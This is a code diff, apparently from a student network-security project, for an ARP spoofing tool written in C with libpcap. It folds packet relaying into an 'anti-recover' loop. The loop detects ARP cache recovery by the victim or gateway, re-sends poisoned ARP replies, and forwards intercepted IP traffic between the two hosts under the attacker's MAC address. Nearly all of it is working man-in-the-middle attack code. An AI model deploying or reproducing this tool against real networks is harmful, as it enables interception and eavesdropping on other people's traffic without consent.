@@ -35,9 +35,8 @@ void sendARPReguest(char* device, char *sender_IP, u_int8_t* my_MAC, int print, 
 void sendPacket(ARPPacket *arpReply, int packeLen, pcap_t *pcd);
 void getMyIP(char* device, u_int8_t* myIP);
 int  findARPReply(char* device, char* rule, u_int8_t *retnMAC);
-int antiRecover(char *device, pcap_t *pcd, char *errBuf, ARPPacket *ARPRecover, u_int8_t *senderMAC, u_int8_t *targetMAC, u_int8_t *senderIP, u_int8_t *targetIP);
-void relay(char *device, pcap_t *pcd, char *errBuf, u_int8_t *senderIP, u_int8_t *targetIP, uint8_t *myMAC, uint8_t *senderMac, uint8_t *targetMAC);
-void sendReplyPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC, const u_char *originPacket);
+int relayAntiRecover(char *device, pcap_t *pcd, char *errBuf, ARPPacket *ARPRecover, u_int8_t *senderMAC, u_int8_t *targetMAC, u_int8_t *senderIP, u_int8_t *targetIP, u_int8_t *myMAC);
+void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC, const u_char *originPacket);
 
 /*send_arp <dev> <sender ip> <target ip>*/
 
@@ -145,20 +144,13 @@ int main(int argc, char *argv[])
     ARPToTargetReply.arp.ea_hdr.ar_op=ntohs(2);              //set opcode 2(reply)
 
 
-
     sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd);//send to gateway request
-int count=0;
-    while(count++<400)
-    {
-        sendPacket(&ARPToTargetReply,sizeof(struct ARPPacket),pcd);//send to gateway request
-        sleep(1);
-    }
     struct ARPPacket ARPRecover;
     int recoverCount=0;
 
     while(true)
     {
-        if(antiRecover(device,pcd,errbuf,&ARPRecover,sender_Mac,target_Mac,ARPReply.arp.arp_tpa,ARPReply.arp.arp_spa))
+        if(relayAntiRecover(device,pcd,errbuf,&ARPRecover,sender_Mac,target_Mac,ARPReply.arp.arp_tpa,ARPReply.arp.arp_spa,my_Mac))
         {
                     cout<<"antiRecover "<<++recoverCount<<"times worked!!"<<endl;
                     sendPacket(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet
@@ -422,7 +414,7 @@ int findARPReply(char *device, char *rule,u_int8_t *retnMAC)
     }
 }
 
-int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_int8_t* senderMAC,u_int8_t* targetMAC,u_int8_t* senderIP,u_int8_t* targetIP)
+int relayAntiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_int8_t* senderMAC,u_int8_t* targetMAC,u_int8_t* senderIP,u_int8_t* targetIP,u_int8_t* myMAC)
 {
 
     bpf_u_int32 netp;
@@ -447,31 +439,45 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
         switch (valueOfNextEx)
         {
             case 1:
-
-                ARPRecover=(struct ARPPacket *)pkt_data;
-                if(ntohs(ARPRecover->eh.ether_type)==ETHERTYPE_ARP) //next packet ARP
                 {
 
-                    //senderPC -> gateway
-                    Mac sha;
-                    Ip  spa;
-                    sha=ARPRecover->arp.arp_sha;
-                    spa=ARPRecover->arp.arp_spa;
+                    ARPRecover=(struct ARPPacket *)pkt_data;
+                    if(ntohs(ARPRecover->eh.ether_type)==ETHERTYPE_ARP) //next packet ARP
+                    {
 
-                    if(sha==senderMAC)
-                        if(spa==senderIP) //recover about senderIP
-                            return 1;
+                        //senderPC -> gateway
+                        Mac sha;
+                        Ip  spa;
+                        sha=ARPRecover->arp.arp_sha;
+                        spa=ARPRecover->arp.arp_spa;
+
+                        if(sha==senderMAC)
+                            if(spa==senderIP) //recover about senderIP
+                                return 1;
 
 
-                    //gateway -> senderPC
+                        //gateway -> senderPC
 
-                    if(sha==targetMAC)
-                        if(spa==targetIP) //recover about targetIP
-                            return 1;
+                        if(sha==targetMAC)
+                            if(spa==targetIP) //recover about targetIP
+                                return 1;
 
+                    }
+
+
+                    IpPacket ippacket(pkt_data);
+                       if(ippacket.isIpPacket)//if packet is packet &
+                       {
+                           if(ippacket.saddr==targetIP)//if destination ip address == target IP
+                               sendRelayPacket(pcd,pktHeader->len,myMAC,senderMAC,pkt_data);
+
+                           if(ippacket.daddr==senderIP)//if destination ip address == target IP
+                              sendRelayPacket(pcd,pktHeader->len,myMAC,targetMAC,pkt_data);
+                       }
+
+
+                     break;
                 }
-
-                 break;
             case 0:
                 cout<<"need a sec.. to packet capture"<<endl;
                 continue;
@@ -489,59 +495,7 @@ int antiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_in
 
 }
 
-void relay(char* device, pcap_t* pcd,char* errBuf, u_int8_t* senderIP,u_int8_t* targetIP,uint8_t* myMAC,uint8_t* senderMAC,uint8_t* targetMAC)
-{
-    bpf_u_int32 netp,maskp;
-
-    if(pcap_lookupnet(device,&netp,&maskp,errBuf)<0)
-    {
-        perror(errBuf);
-        exit(1);
-    }
-
-    struct pcap_pkthdr *pkthdr;
-    const u_int8_t* pktdata;
-    int valueOfNextEx=0;
-
-    while(true)
-    {
-
-        //need a thread
-        valueOfNextEx=pcap_next_ex(pcd,&pkthdr,&pktdata);
-
-        switch (valueOfNextEx)
-        {
-            case 1:
-            {
-             IpPacket ippacket(pktdata);
-                if(ippacket.isIpPacket)//if packet is packet &
-                {
-                    if(ippacket.saddr==targetIP)//if destination ip address == target IP
-                        sendReplyPacket(pcd,pkthdr->len,myMAC,senderMAC,pktdata);
-
-                    if(ippacket.daddr==senderIP)//if destination ip address == target IP
-                       sendReplyPacket(pcd,pkthdr->len,myMAC,targetMAC,pktdata);
-                }
-                break;
-            }
-            case 0:
-                cout<<"need a sec.. to packet capture"<<endl;
-                continue;
-            case -1:
-                perror("pcap_next_ex function has an error!!");
-                exit(1);
-
-            case -2:
-                cout<<"the packet have reached EOF!!"<<endl;
-                exit(0);
-            default:
-                break;
-            }
-    }
-
-}
-
-void sendReplyPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC,const u_char* originPacket)
+void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC,const u_char* originPacket)
 {
     u_char mPacket[len];
     memcpy(mPacket,originPacket,len);
